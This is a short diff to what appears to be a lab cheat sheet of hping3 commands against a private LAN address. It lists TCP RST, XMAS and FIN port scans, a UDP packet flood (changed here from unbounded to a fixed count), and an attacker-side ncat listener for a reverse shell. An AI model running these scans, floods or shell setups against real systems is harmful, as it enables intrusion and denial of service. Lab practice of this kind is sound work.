@@ -14,13 +14,13 @@ TCP RST only
 sudo hping3 -c 1 -R -p 443 192.168.0.16
 
 TCP XMAS
-hping -X -p 443 192.168.0.16
+sudo hping -c 1 -X -p 443 192.168.0.16
 
 TCP FIN scan
-hping3 -F --scan 8000-9000 192.168.0.16
+sudo hping3 -F --scan 8000-9000 192.168.0.16
 
 UDP flood
-hping3 -2 --flood -p 80 192.168.0.16
+sudo hping3 -2 -c 1000 -i u1 -p 80 192.168.0.16
 
 reverse shell attacker:
 ncat -l 8080
